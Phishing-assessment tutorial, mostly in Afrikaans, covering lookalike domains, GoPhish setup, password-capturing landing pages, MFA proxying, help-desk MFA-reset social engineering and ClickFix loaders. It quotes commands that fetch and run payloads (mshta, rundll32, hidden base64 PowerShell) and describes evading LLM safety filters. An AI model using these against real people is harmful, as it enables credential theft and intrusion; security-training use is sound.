# Phishing Methodology

{{#include ../../banners/hacktricks-training.md}}

## Metodologie

1. Verken die slagoffer
1. Kies die **slagoffer-domein**.
2. Voer basiese web-enumerasie uit deur **aanmeldportale te soek** wat deur die slagoffer gebruik word, en **besluit** watter een jy gaan **naboots**.
3. Gebruik **OSINT** om **e-posadresse te vind**.
2. Berei die omgewing voor
1. **Koop die domein** wat jy vir die phishing-assessment gaan gebruik
2. **Konfigureer die e-posdiens** se verwante rekords (SPF, DMARC, DKIM, rDNS)
3. Konfigureer die VPS met **gophish**
3. Berei die veldtog voor
1. Berei die **e-pos-template** voor
2. Berei die **webblad** voor om die credentials te steel
4. Begin die veldtog!

## Genereer soortgelyke domeinname of koop 'n vertroude domein

### Domain Name Variation Techniques

- **Keyword**: Die domeinnaam **bevat** 'n belangrike **keyword** van die oorspronklike domein (bv. zelster.com-management.com).<sup>[[1]](#references)</sup>
- **hypened subdomain**: Verander die **punt na 'n koppelteken** van 'n subdomein (bv. www-zelster.com).
- **New TLD**: Dieselfde domein met 'n **nuwe TLD** (bv. zelster.org)
- **Homoglyph**: Dit **vervang** 'n letter in die domeinnaam met **letters wat soortgelyk lyk** (bv. zelfser.com).


{{#ref}}
homograph-attacks.md
{{#endref}}
- **Transposition:** Dit **ruil twee letters** binne die domeinnaam om (bv. zelsetr.com).
- **Singularization/Pluralization**: Voeg “s” aan die einde van die domeinnaam by of verwyder dit (bv. zeltsers.com).
- **Omission**: Dit **verwyder een** van die letters uit die domeinnaam (bv. zelser.com).
- **Repetition:** Dit **herhaal een** van die letters in die domeinnaam (bv. zeltsser.com).
- **Replacement**: Soos homoglyph, maar minder stealthy. Dit vervang een van die letters in die domeinnaam, moontlik met 'n letter wat naby die oorspronklike letter op die keyboard is (bv. zektser.com).
- **Subdomained**: Voeg 'n **punt** binne die domeinnaam in (bv. ze.lster.com).
- **Insertion**: Dit **voeg 'n letter** in die domeinnaam in (bv. zerltser.com).
- **Missing dot**: Voeg die TLD by die domeinnaam. (bv. zelstercom.com)

**Automatic Tools**

- [**dnstwist**](https://github.com/elceef/dnstwist)
- [**urlcrazy**](https://github.com/urbanadventurer/urlcrazy)

**Websites**

- [https://dnstwist.it/](https://dnstwist.it)
- [https://dnstwister.report/](https://dnstwister.report)
- [https://www.internetmarketingninjas.com/tools/free-tools/domain-typo-generator/](https://www.internetmarketingninjas.com/tools/free-tools/domain-typo-generator/)

### Bitflipping

Daar is 'n **moontlikheid dat een van die bisse wat gestoor word of in kommunikasie is, outomaties omgekeer kan word** weens verskeie faktore soos sonvlamme, kosmiese strale of hardewarefoute.

Wanneer hierdie konsep **op DNS-versoeke toegepas word**, is dit moontlik dat die **domein wat deur die DNS-bediener ontvang word** nie dieselfde is as die domein wat aanvanklik versoek is nie.

Byvoorbeeld, kan 'n enkele bit-verandering in die domein "windows.com" dit na "windnws.com" verander.

Aanvallers kan **hierdie geleentheid benut deur verskeie bit-flipping-domeine te registreer** wat soortgelyk aan die slagoffer se domein is. Hulle bedoeling is om wettige gebruikers na hul eie infrastruktuur te herlei.

Vir meer inligting, lees [https://www.bleepingcomputer.com/news/security/hijacking-traffic-to-microsoft-s-windowscom-with-bitflipping/](https://www.bleepingcomputer.com/news/security/hijacking-traffic-to-microsoft-s-windowscom-with-bitflipping/).<sup>[[10]](#references)[[11]](#references)</sup>

### Koop 'n vertroude domein

Jy kan op [https://www.expireddomains.net/](https://www.expireddomains.net) soek vir 'n vervalde domein wat jy kan gebruik.\
Om seker te maak dat die vervalde domein wat jy gaan koop **reeds goeie SEO het**, kan jy soek hoe dit gekategoriseer word in:

- [http://www.fortiguard.com/webfilter](http://www.fortiguard.com/webfilter)
- [https://urlfiltering.paloaltonetworks.com/query/](https://urlfiltering.paloaltonetworks.com/query/)

## E-posadresse ontdek

- [https://github.com/laramies/theHarvester](https://github.com/laramies/theHarvester) (100% gratis)
- [https://phonebook.cz/](https://phonebook.cz) (100% gratis)
- [https://maildb.io/](https://maildb.io)
- [https://hunter.io/](https://hunter.io)
- [https://anymailfinder.com/](https://anymailfinder.com)

Om **meer** geldige e-posadresse te **ontdek** of die adresse wat jy reeds ontdek het te **verifieer**, kan jy kyk of jy brute-force op die SMTP-bedieners van die slagoffer kan uitvoer. [Learn how to verify/discover email address here](../../network-services-pentesting/pentesting-smtp/index.html#username-bruteforce-enumeration).\
Moet ook nie vergeet dat indien die gebruikers **enige webportaal gebruik om toegang tot hul e-posse te verkry nie**, jy kan kyk of dit kwesbaar is vir **username brute force**, en die kwesbaarheid indien moontlik kan uitbuit.

## GoPhish konfigureer

### Installasie

Jy kan dit aflaai vanaf [https://github.com/gophish/gophish/releases/tag/v0.11.0](https://github.com/gophish/gophish/releases/tag/v0.11.0)

Laai dit af, dekomprimeer dit binne `/opt/gophish` en voer `/opt/gophish/gophish` uit\
Jy sal 'n password vir die admin-gebruiker op poort 3333 in die uitvoer kry. Gaan daarom na daardie poort en gebruik daardie credentials om die admin-password te verander. Jy sal moontlik daardie poort na local moet tunnel:
```bash
ssh -L 3333:127.0.0.1:3333 <user>@<ip>
```
### Konfigurasie

**TLS-sertifikaatkonfigurasie**

Voor hierdie stap behoort jy **reeds die domein gekoop** te hê wat jy gaan gebruik, en dit moet **wys na** die **IP van die VPS** waar jy **gophish** konfigureer.
```bash
DOMAIN="<domain>"
wget https://dl.eff.org/certbot-auto
chmod +x certbot-auto
sudo apt install snapd
sudo snap install core
sudo snap refresh core
sudo apt-get remove certbot
sudo snap install --classic certbot
sudo ln -s /snap/bin/certbot /usr/bin/certbot
certbot certonly --standalone -d "$DOMAIN"
mkdir /opt/gophish/ssl_keys
cp "/etc/letsencrypt/live/$DOMAIN/privkey.pem" /opt/gophish/ssl_keys/key.pem
cp "/etc/letsencrypt/live/$DOMAIN/fullchain.pem" /opt/gophish/ssl_keys/key.crt​
```
**Poskonfigurasie**

Begin deur te installeer: `apt-get install postfix`

Voeg dan die domein by die volgende lêers:

- **/etc/postfix/virtual_domains**
- **/etc/postfix/transport**
- **/etc/postfix/virtual_regexp**

**Verander ook die waardes van die volgende veranderlikes binne /etc/postfix/main.cf**

`myhostname = <domain>`\
`mydestination = $myhostname, <domain>, localhost.com, localhost`

Laastens, wysig die lêers **`/etc/hostname`** en **`/etc/mailname`** na jou domeinnaam en **herbegin jou VPS.**

Skep nou ’n **DNS A record** van `mail.<domain>` wat na die **IP-adres** van die VPS wys, asook ’n **DNS MX**-record wat na `mail.<domain>` wys.

Kom ons toets nou om ’n e-pos te stuur:
```bash
apt install mailutils
echo "This is the body of the email" | mail -s "This is the subject line" test@email.com
```
**Gophish-konfigurasie**

Stop die uitvoering van gophish en kom ons konfigureer dit.\
Wysig `/opt/gophish/config.json` na die volgende (let op die gebruik van https):
```bash
{
"admin_server": {
"listen_url": "127.0.0.1:3333",
"use_tls": true,
"cert_path": "gophish_admin.crt",
"key_path": "gophish_admin.key"
},
"phish_server": {
"listen_url": "0.0.0.0:443",
"use_tls": true,
"cert_path": "/opt/gophish/ssl_keys/key.crt",
"key_path": "/opt/gophish/ssl_keys/key.pem"
},
"db_name": "sqlite3",
"db_path": "gophish.db",
"migrations_prefix": "db/db_",
"contact_address": "",
"logging": {
"filename": "",
"level": ""
}
}
```
**Konfigureer gophish-diens**

Om die gophish-diens te skep sodat dit outomaties begin en as ’n diens bestuur kan word, kan jy die lêer `/etc/init.d/gophish` met die volgende inhoud skep:
```bash
#!/bin/bash
# /etc/init.d/gophish
# initialization file for stop/start of gophish application server
#
# chkconfig: - 64 36
# description: stops/starts gophish application server
# processname:gophish
# config:/opt/gophish/config.json
# From https://github.com/gophish/gophish/issues/586

# define script variables

processName=Gophish
process=gophish
appDirectory=/opt/gophish
logfile=/var/log/gophish/gophish.log
errfile=/var/log/gophish/gophish.error

start() {
echo 'Starting '${processName}'...'
cd ${appDirectory}
nohup ./$process >>$logfile 2>>$errfile &
sleep 1
}

stop() {
echo 'Stopping '${processName}'...'
pid=$(/bin/pidof ${process})
kill ${pid}
sleep 1
}

status() {
pid=$(/bin/pidof ${process})
if [["$pid" != ""| "$pid" != "" ]]; then
echo ${processName}' is running...'
else
echo ${processName}' is not running...'
fi
}

case $1 in
start|stop|status) "$1" ;;
esac
```
Voltooi die konfigurasie van die diens en kontroleer dit deur:
```bash
mkdir /var/log/gophish
chmod +x /etc/init.d/gophish
update-rc.d gophish defaults
#Check the service
service gophish start
service gophish status
ss -l | grep "3333\|443"
service gophish stop
```
## Konfigureer mail server en domein

### Wag & wees legit

Hoe ouer ’n domein is, hoe minder waarskynlik is dit dat dit as spam geïdentifiseer sal word. Daarom moet jy so lank as moontlik wag (minstens 1 week) voordat die phishing-assessment uitgevoer word. Verder sal die reputasie wat verkry word beter wees as jy ’n bladsy oor ’n sektor met ’n goeie reputasie plaas.

Let daarop dat jy, selfs al moet jy ’n week wag, nou alles kan klaar konfigureer.

### Konfigureer Reverse DNS (rDNS)-rekord

Stel ’n rDNS (PTR)-rekord op wat die IP-adres van die VPS na die domeinnaam oplos.

### Sender Policy Framework (SPF)-rekord

Jy moet **’n SPF-rekord vir die nuwe domein konfigureer**. As jy nie weet wat ’n SPF-rekord is nie, [**lees hierdie bladsy**](../../network-services-pentesting/pentesting-smtp/index.html#spf).

Jy kan [https://www.spfwizard.net/](https://www.spfwizard.net) gebruik om jou SPF-beleid te genereer (gebruik die IP van die VPS-masjien).

![SPF Wizard-vorm vir die generering van ’n SPF-rekord vir ’n phishing-domein](<../../images/image (1037).png>)

Dit is die inhoud wat binne ’n TXT-rekord binne die domein gestel moet word:
```bash
v=spf1 mx a ip4:ip.ip.ip.ip ?all
```
### Domeingebaseerde boodskapverifikasie, verslagdoening en nakoming (DMARC)-rekord

Jy moet **'n DMARC-rekord vir die nuwe domein konfigureer**. As jy nie weet wat 'n DMARC-rekord is nie, [**lees hierdie bladsy**](../../network-services-pentesting/pentesting-smtp/index.html#dmarc).

Jy moet 'n nuwe DNS TXT-rekord skep wat na die gasheernaam `_dmarc.<domain>` wys, met die volgende inhoud:
```bash
v=DMARC1; p=none
```
### DomainKeys Identified Mail (DKIM)

Jy moet **'n DKIM vir die nuwe domein konfigureer**. As jy nie weet wat 'n DKIM-rekord is nie, [**lees hierdie bladsy**](../../network-services-pentesting/pentesting-smtp/index.html#dkim).

Hierdie tutoriaal is gebaseer op: [https://www.digitalocean.com/community/tutorials/how-to-install-and-configure-dkim-with-postfix-on-debian-wheezy](https://www.digitalocean.com/community/tutorials/how-to-install-and-configure-dkim-with-postfix-on-debian-wheezy).<sup>[[5]](#references)</sup>

> [!TIP]
> Jy moet albei B64-waardes wat die DKIM-sleutel genereer, saamvoeg:
>
> ```
> v=DKIM1; h=sha256; k=rsa; p=MIIBIjANBgkqhkiG9w0BAQEFAAOCAQ8AMIIBCgKCAQEA0wPibdqPtzYk81njjQCrChIcHzxOp8a1wjbsoNtka2X9QXCZs+iXkvw++QsWDtdYu3q0Ofnr0Yd/TmG/Y2bBGoEgeE+YTUG2aEgw8Xx42NLJq2D1pB2lRQPW4IxefROnXu5HfKSm7dyzML1gZ1U0pR5X4IZCH0wOPhIq326QjxJZm79E1nTh3xj" "Y9N/Dt3+fVnIbMupzXE216TdFuifKM6Tl6O/axNsbswMS1TH812euno8xRpsdXJzFlB9q3VbMkVWig4P538mHolGzudEBg563vv66U8D7uuzGYxYT4WS8NVm3QBMg0QKPWZaKp+bADLkOSB9J2nUpk4Aj9KB5swIDAQAB
> ```

### Toets jou e-poskonfigurasietelling

Jy kan dit doen deur [https://www.mail-tester.com/](https://www.mail-tester.com) te gebruik\
Maak net die bladsy oop en stuur 'n e-pos na die adres wat hulle vir jou gee:
```bash
echo "This is the body of the email" | mail -s "This is the subject line" test-iimosa79z@srv1.mail-tester.com
```
Jy kan ook jou **e-poskonfigurasie nagaan** deur ’n e-pos aan `check-auth@verifier.port25.com` te stuur en die **antwoord te lees** (hiervoor sal jy poort **25** moet **oopmaak** en die antwoord in die lêer _/var/mail/root_ sien as jy die e-pos as root stuur).\
Maak seker dat jy al die toetse slaag:
```bash
==========================================================
Summary of Results
==========================================================
SPF check:          pass
DomainKeys check:   neutral
DKIM check:         pass
Sender-ID check:    pass
SpamAssassin check: ham
```
Jy kan ook **’n boodskap na ’n Gmail-rekening onder jou beheer stuur** en die **e-pos se opskrifte** in jou Gmail-inkassie nagaan; `dkim=pass` behoort in die `Authentication-Results`-opskrifveld teenwoordig te wees.
```
Authentication-Results: mx.google.com;
spf=pass (google.com: domain of contact@example.com designates --- as permitted sender) smtp.mail=contact@example.com;
dkim=pass header.i=@example.com;
```
### ​Verwydering van Spamhouse-bloklys

Die bladsy [www.mail-tester.com](https://www.mail-tester.com) kan aandui of jou domein deur spamhouse geblokkeer word. Jy kan versoek dat jou domein/IP verwyder word by: ​[https://www.spamhaus.org/lookup/](https://www.spamhaus.org/lookup/)

### Verwydering van Microsoft-bloklys

​​Jy kan versoek dat jou domein/IP verwyder word by [https://sender.office.com/](https://sender.office.com).

## Skep & Begin GoPhish Campaign

### Stuurprofiel

- Stel ’n **naam om te identifiseer** die senderprofiel in
- Besluit vanaf watter rekening jy die phishing-e-posse gaan stuur. Voorstelle: _noreply, support, servicedesk, salesforce..._
- Jy kan die gebruikersnaam en wagwoord leeg laat, maar maak seker dat jy Ignore Certificate Errors merk

![Skep & Begin GoPhish Campaign - Stuurprofiel: Jy kan die gebruikersnaam en wagwoord leeg laat, maar maak seker dat jy Ignore Certificate Errors merk](<../../images/image (253) (1) (2) (1) (1) (2) (2) (3) (3) (5) (3) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (10) (15) (2).png>)

> [!TIP]
> Dit word aanbeveel om die "**Send Test Email**"-funksionaliteit te gebruik om te toets of alles werk.\
> Ek sal aanbeveel om die toets-e-posse na 10min mail-adresse te **stuur** om te voorkom dat jy tydens die toetse op ’n bloklys geplaas word.

### E-possjabloon

- Stel ’n **naam om te identifiseer** die sjabloon in
- Skryf dan ’n **onderwerp** (niks vreemds nie, net iets wat jy sou verwag om in ’n gewone e-pos te lees)
- Maak seker dat jy "**Add Tracking Image**" gemerk het
- Skryf die **e-possjabloon** (jy kan veranderlikes soos in die volgende voorbeeld gebruik):
```html
<html>
<head>
<title></title>
</head>
<body>
<p class="MsoNormal"><span style="font-size:10.0pt;font-family:&quot;Verdana&quot;,sans-serif;color:black">Dear {{.FirstName}} {{.LastName}},</span></p>
<br />
Note: We require all user to login an a very suspicios page before the end of the week, thanks!<br />
<br />
Regards,</span></p>

WRITE HERE SOME SIGNATURE OF SOMEONE FROM THE COMPANY

<p>{{.Tracker}}</p>
</body>
</html>
```
Let daarop dat **om die geloofwaardigheid van die e-pos te verhoog**, dit aanbeveel word om een of ander handtekening uit ’n e-pos van die kliënt te gebruik. Voorstelle:

- Stuur ’n e-pos na ’n **nie-bestaande adres** en kyk of die antwoord enige handtekening bevat.
- Soek **publieke e-posadresse** soos info@ex.com of press@ex.com of public@ex.com, stuur vir hulle ’n e-pos en wag vir die antwoord.
- Probeer om ’n **geldige ontdekte** e-posadres te kontak en wag vir die antwoord.

![Sending Profile - Email Template: Probeer om ’n geldige ontdekte e-posadres te kontak en wag vir die antwoord](<../../images/image (80).png>)

> [!TIP]
> Die Email Template laat jou ook toe om **lêers aan te heg om te stuur**. As jy ook NTLM challenges wil steel deur spesiaal vervaardigde lêers/dokumente te gebruik [lees hierdie bladsy](../../windows-hardening/ntlm/places-to-steal-ntlm-creds.md).

### Landing Page

- Stel ’n **naam** in.
- **Skryf die HTML-kode** van die webblad. Let daarop dat jy webblaaie kan **import**.
- Merk **Capture Submitted Data** en **Capture Passwords**.
- Stel ’n **redirect** in.

![Email Template - Landing Page: Merk Capture Submitted Data en Capture Passwords](<../../images/image (826).png>)

> [!TIP]
> Gewoonlik sal jy die HTML-kode van die bladsy moet wysig en plaaslik ’n paar toetse moet uitvoer (moontlik deur ’n Apache-server te gebruik) **totdat jy van die resultate hou.** Skryf dan daardie HTML-kode in die blokkie.\
> Let daarop dat, as jy **statiese hulpbronne** vir die HTML moet **gebruik** (moontlik sommige CSS- en JS-bladsye), jy dit in _**/opt/gophish/static/endpoint**_ kan stoor en dit dan vanaf _**/static/\<filename>**_ kan bereik.

> [!TIP]
> Vir die redirect kan jy die **gebruikers na die wettige hoofwebblad** van die slagoffer herlei, of hulle byvoorbeeld na _/static/migration.html_ herlei, ’n **laaisirkel (**[**https://loading.io/**](https://loading.io)**) vir 5 sekondes wys en dan aandui dat die proses suksesvol was**.

### Users & Groups

- Stel ’n naam in.
- **Import die data** (let daarop dat jy, om die template vir die voorbeeld te gebruik, die voornaam, van en e-posadres van elke gebruiker nodig het).

![Landing Page - Users & Groups: Import the data (let daarop dat jy die voornaam, van en e-posadres van elke gebruiker nodig het om die template vir die voorbeeld te gebruik)](<../../images/image (163).png>)

### Campaign

Skep ten slotte ’n campaign deur ’n naam, die email template, die landing page, die URL, die sending profile en die groep te kies. Let daarop dat die URL die skakel sal wees wat aan die slagoffers gestuur word.

Let daarop dat die **Sending Profile jou toelaat om ’n toets-e-pos te stuur om te sien hoe die finale phishing-e-pos lyk**:

![Users & Groups - Campaign: Let daarop dat die Sending Profile jou toelaat om ’n toets-e-pos te stuur om te sien hoe die finale phishing-e-pos lyk](<../../images/image (192).png>)

Wanneer alles gereed is, launch jy net die campaign!

## Website Cloning

As jy om enige rede die webwerf wil clone, kyk na die volgende bladsy:


{{#ref}}
clone-a-website.md
{{#endref}}

## Backdoored Documents & Files

In sommige phishing-assessments (hoofsaaklik vir Red Teams) sal jy ook **lêers wil stuur wat een of ander soort backdoor bevat** (moontlik ’n C2 of moontlik net iets wat ’n authentication sal trigger).\
Kyk na die volgende bladsy vir enkele voorbeelde:


{{#ref}}
phishing-documents.md
{{#endref}}

## Phishing MFA

### Via Proxy MitM

Die vorige aanval is redelik slim, aangesien jy ’n regte webwerf namaak en die inligting insamel wat deur die gebruiker ingevoer word. Ongelukkig, as die gebruiker nie die korrekte wagwoord ingevoer het nie of as die toepassing wat jy nagemaak het met 2FA gekonfigureer is, **sal hierdie inligting jou nie toelaat om die misleide gebruiker na te boots nie**.

Dit is waar tools soos [**evilginx2**](https://github.com/kgretzky/evilginx2)**,** [**CredSniper**](https://github.com/ustayready/CredSniper) en [**muraena**](https://github.com/muraenateam/muraena) nuttig is. Hierdie tool laat jou toe om ’n MitM-agtige aanval te genereer. Basies werk die aanvalle soos volg:

1. Jy **boots die login-form** van die regte webblad na.
2. Die gebruiker **stuur** sy **credentials** na jou fake page, en die tool stuur dit na die regte webblad, **terwyl dit kontroleer of die credentials werk**.
3. As die rekening met **2FA** gekonfigureer is, sal die MitM-bladsy daarvoor vra, en sodra die **gebruiker dit invoer**, sal die tool dit na die regte webblad stuur.
4. Sodra die gebruiker ge-authenticate is, sal jy (as aanvaller) die **credentials, die 2FA, die cookie en enige inligting** van elke interaksie hê wat plaasvind terwyl die tool ’n MitM uitvoer.

### Via VNC

Wat as jy, in plaas daarvan om die **slagoffer na ’n malicious page te stuur** wat dieselfde lyk as die oorspronklike een, hom na ’n **VNC-sessie met ’n browser wat aan die regte webblad gekoppel is** stuur? Jy sal kan sien wat hy doen, die wagwoord steel, die gebruikte MFA, die cookies...\
Jy kan dit met [**EvilnVNC**](https://github.com/JoelGMSec/EvilnoVNC) doen.<sup>[[3]](#references)[[4]](#references)</sup>

## Detecting the detection

Een van die beste maniere om te weet of jy uitgevang is, is natuurlik om jou domein binne **blacklists te soek**. As dit gelys verskyn, is jou domein op een of ander manier as verdag beskou.\
Een maklike manier om te kyk of jou domein in enige blacklist verskyn, is om [https://malwareworld.com/](https://malwareworld.com) te gebruik.

Daar is egter ander maniere om te weet of die slagoffer **aktief na verdagte phishing-aktiwiteit in die natuur soek**, soos verduidelik in:


{{#ref}}
detecting-phising.md
{{#endref}}

Jy kan ’n **domein met ’n baie soortgelyke naam** as die slagoffer se domein **koop en/of ’n sertifikaat genereer** vir ’n **subdomein** van ’n domein wat deur jou beheer word, wat die **keyword** van die slagoffer se domein **bevat**. As die **slagoffer** enige soort **DNS- of HTTP-interaksie** daarmee uitvoer, sal jy weet dat **hy aktief soek** na verdagte domeine en dat jy baie stealthy sal moet wees.<sup>[[2]](#references)</sup>

### Evaluate the phishing

Gebruik [**Phishious** ](https://github.com/Rices/Phishious)om te evalueer of jou e-pos in die spamfolder gaan beland, of dit geblokkeer sal word of suksesvol sal wees.

## High-Touch Identity Compromise (Help-Desk MFA Reset)

Moderne intrusion sets slaan toenemend e-poslokkies heeltemal oor en **teiken die service-desk / identity-recovery-workflow direk** om MFA te omseil. Die aanval is volledig "living-off-the-land": sodra die operator geldige credentials besit, beweeg hy lateraal met ingeboude admin-tools – geen malware word benodig nie.<sup>[[6]](#references)</sup>

### Attack flow
1. Doen reconnaissance op die slagoffer.
* Versamel persoonlike en korporatiewe besonderhede van LinkedIn, data breaches, publieke GitHub, ens.
* Identifiseer identities met hoë waarde (bestuurders, IT, finansies) en bepaal die **presiese help-desk-proses** vir password / MFA reset.
2. Real-time social engineering
* Bel, gebruik Teams of chat met die help-desk terwyl jy jou as die teiken voordoen (dikwels met **spoofed caller-ID** of ’n **geklone stem**).
* Verskaf die vooraf ingesamelde PII om kennisgebaseerde verifikasie te slaag.
* Oortuig die agent om die **MFA-secret te reset** of ’n **SIM-swap** op ’n geregistreerde selfoonnommer uit te voer.
3. Immediate post-access actions (≤60 min in real cases)
* Vestig ’n foothold deur enige web SSO-portal.
* Enumerate AD / AzureAD met built-ins (geen binaries word dropped nie):
```powershell
# list directory groups & privileged roles
Get-ADGroup -Filter * -Properties Members | ?{$_.Members -match $env:USERNAME}

# AzureAD / Graph – list directory roles
Get-MgDirectoryRole | ft DisplayName,Id

# Enumerate devices the account can login to
Get-MgUserRegisteredDevice -UserId <user@corp.local>
```
* Laterale beweging met **WMI**, **PsExec** of wettige **RMM**-agents wat reeds in die environment gewhitelist is.

### Detection & Mitigation
* Behandel help-desk identity recovery as ’n **privileged operation** – vereis step-up auth en manager approval.
* Ontplooi **Identity Threat Detection & Response (ITDR)** / **UEBA**-reëls wat die volgende alert:
* MFA-method verander + authentication vanaf ’n nuwe device / geo.
* Onmiddellike elevation van dieselfde principal (user-→-admin).
* Neem help-desk-oproepe op en vereis ’n **call-back na ’n reeds geregistreerde nommer** voordat enige reset uitgevoer word.
* Implementeer **Just-In-Time (JIT) / Privileged Access** sodat nuut-geresette rekeninge nie outomaties high-privilege tokens erf nie.

---

## At-Scale Deception – SEO Poisoning & “ClickFix” Campaigns
Commodity crews verlaag die koste van high-touch ops met massa-aanvalle wat **search engines en ad networks in die delivery channel verander**.<sup>[[6]](#references)</sup>

1. **SEO poisoning / malvertising** stoot ’n fake resultaat soos `chromium-update[.]site` na die boonste search ads.
2. Die slagoffer laai ’n klein **first-stage loader** af (dikwels JS/HTA/ISO). Voorbeelde wat deur Unit 42 gesien is:
* `RedLine stealer`
* `Lumma stealer`
* `Lampion Trojan`
3. Die loader exfiltreer browser cookies + credential DBs en trek dan ’n **silent loader** af wat – *in realtime* – besluit of dit die volgende moet deploy:
* RAT (bv. AsyncRAT, RustDesk)
* ransomware / wiper
* persistence component (registry Run key + scheduled task)

### Hardening tips
* Blokkeer nuut-geregistreerde domeine en dwing **Advanced DNS / URL Filtering** af op *search-ads* sowel as e-pos.
* Beperk sagteware-installering tot signed MSI / Store packages; weier `HTA`, `ISO` en `VBS` execution volgens beleid.
* Monitor vir child processes van browsers wat installers open:
```yaml
- parent_image: /Program Files/Google/Chrome/*
and child_image: *\\*.exe
```
* Hunt vir LOLBins wat gereeld deur first-stage loaders misbruik word (bv. `regsvr32`, `curl`, `mshta`).

### Download-button click hijacking with TDS handoff
Sommige fake software portals hou die sigbare download-`href` na die **regte GitHub/release URL** gewys, maar hijack die **eerste** user interaction in JavaScript en stuur die slagoffer eerder in ’n **Traffic Distribution System (TDS)**-chain in.<sup>[[9]](#references)</sup>
```javascript
const cachedOpen = window.open;
document.addEventListener(isChromeDesktop() ? "mousedown" : "click", (e) => {
if (!isEligibleClick(e.target)) return;
cachedOpen(generateRuntimeURL({referrer: location.href, userDestination: extractClickedLink(e.target)}));
e.stopImmediatePropagation();
e.preventDefault();
}, true);
```
Sleutelkenmerke:
- Die hook loop gewoonlik in die **capture phase** (`true`) op `document`, sodat dit voor werfhandlers geaktiveer word.
- Chrome gebruik dikwels `mousedown` in plaas van `click` om die redirect aan ’n geldige **user gesture** gekoppel te hou en die omseiling van popup-blockers te verbeter.
- Sommige variante maak vooraf `about:blank` oop of sintetiseer klikke op `<a target="_blank">`-elemente, en ken eers later die TDS-URL toe.
- Browser-side caps word dikwels in `localStorage` gestoor, sodat die **eerste klik** malware kan bereik, terwyl refreshes/herprobeers na die oënskynlik goedaardige sigbare skakel terugval.
- Die TDS kan filter volgens referrer, entry domain, GEO, browser/device fingerprint, VPN/datacenter-kontroles, klik-konteks en per-session counters, wat herhalings deur analiste nie-deterministies maak.

Idees vir verdedigers:
- Vergelyk die **vertoonde** `href` met die **werklike** navigation target wat tydens die klik gegenereer word.
- Soek na `document.addEventListener(..., true)`-handlers wat beide `preventDefault()` en `stopImmediatePropagation()` rondom `window.open`, `about:blank` of sintetiese anchor-klikke aanroep.
- Behandel groepe nuut-geregistreerde sagteware-aflaaidomeine wat almal dieselfde CloudFront/JS stage laai as ’n sterk SEO-poisoning/TDS-patroon.

### ClickFix vanaf vals verification pages + archive-looking LOLBAS fetches
Sommige TDS-vertakkings eindig op ’n vals verification page (Cloudflare/IUAM-styl) wat die slagoffer opdrag gee om ’n trusted Windows binary soos:<sup>[[9]](#references)</sup> te laat loop.
```cmd
C:\Windows\SysWOW64\mshta.exe https://example[.]com/navy.7z
```
Notas:
- `mshta.exe` voer die **HTA/VBScript aan die begin van die respons** uit, selfs al gee die URL voor dat dit ’n `.7z`-argief is; bygevoegde argiefdata kan suiwer lokdata wees.
- Opvolgstadiums hou dikwels aan om oor die lêertipe te lieg (`.rtf` vir PowerShell, `.asar` vir Python, ZIP-lêers met opgestopte binaries) en skakel dan oor na **manual PE mapping / in-memory execution**.
- As jy op een van hierdie kettings reageer, behou **network + memory vanaf die eerste suksesvolle run**: latere herhalings wys dalk slegs ’n benigne installer/SFX-pad of misluk omdat die payload/key release aan die oorspronklike TDS-sessie gekoppel was.

### ClickFix DLL delivery tradecraft (fake CERT update)
* Lokmiddel: ’n gekloonde nasionale CERT-advies met ’n **Update**-knoppie wat stap-vir-stap-“fix”-instruksies vertoon. Slagoffers word aangesê om ’n batch uit te voer wat ’n DLL aflaai en dit via `rundll32` uitvoer.<sup>[[12]](#references)</sup>
* Tipiese batch-ketting wat waargeneem is:
```cmd
echo powershell -Command "Invoke-WebRequest -Uri 'https://example[.]org/notepad2.dll' -OutFile '%TEMP%\notepad2.dll'"
echo timeout /t 10
echo rundll32.exe "%TEMP%\notepad2.dll",notepad
```
* `Invoke-WebRequest` plaas die payload in `%TEMP%`, ’n kort slaaptyd verberg network jitter, waarna `rundll32` die uitgevoerde entrypoint (`notepad`) oproep.
* Die DLL stuur die host identity en poll elke paar minute vir C2. Remote tasking arriveer as **base64-encoded PowerShell** wat hidden en met policy bypass uitgevoer word:
```powershell
powershell.exe -NoProfile -ExecutionPolicy Bypass -WindowStyle Hidden -Command "[System.Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('<b64_task>')) | Invoke-Expression"
```
* Dit behou C2-flexibility (die server kan take omruil sonder om die DLL by te werk) en verberg console windows. Soek na PowerShell-kinders van `rundll32.exe` wat `-WindowStyle Hidden` + `FromBase64String` + `Invoke-Expression` saam gebruik.
* Defenders kan HTTP(S)-callbacks in die vorm `...page.php?tynor=<COMPUTER>sss<USER>` en 5-minute poll-intervalle ná DLL-load soek.

---

## AI-versterkte Phishing Operations
Attackers koppel nou **LLM- & voice-clone-API’s** vir volledig gepersonaliseerde lokmiddels en intydse interaksie.

| Layer | Example use by threat actor |
|-------|-----------------------------|
|Outomatisering|Genereer & stuur >100 k e-posse / SMS’e met gerandomiseerde bewoording & tracking links.|
|Generatiewe AI|Produseer *eenmalige* e-posse wat na openbare M&A verwys, inside jokes uit social media; deep-fake CEO voice in callback scam.|
|Agentic AI|Registreer outonoom domeine, scrape open-source intel, en stel next-stage e-posse op wanneer ’n slagoffer klik maar nie creds indien nie.|

**Defence:**
• Voeg **dynamic banners** by wat boodskappe uit ontrusted automation uitlig (via ARC/DKIM anomalies).
• Implementeer **voice-biometric challenge phrases** vir hoërisiko-telefoniese versoeke.
• Simuleer voortdurend AI-generated lokmiddels in awareness programmes – static templates is obsolete.

Sien ook – agentic browsing abuse vir credential phishing:

{{#ref}}
ai-agent-mode-phishing-abusing-hosted-agent-browsers.md
{{#endref}}

Sien ook – AI agent abuse van local CLI tools en MCP (vir secrets inventory en detection):

{{#ref}}
ai-agent-abuse-local-ai-cli-tools-and-mcp.md
{{#endref}}

## LLM-assisted runtime assembly van phishing JavaScript (in-browser codegen)

Attackers kan HTML wat benigne lyk lewer en die **stealer tydens runtime genereer** deur ’n **trusted LLM API** vir JavaScript te vra en dit dan in die browser uit te voer (bv. `eval` of dinamiese `<script>`).<sup>[[8]](#references)</sup>

1. **Prompt-as-obfuscation:** enkodeer exfil URLs/Base64 strings in die prompt; itereer die bewoording om safety filters te omseil en hallucinations te verminder.
2. **Client-side API call:** tydens load roep JS ’n public LLM (Gemini/DeepSeek/etc.) of ’n CDN proxy; slegs die prompt/API call is in die static HTML teenwoordig.
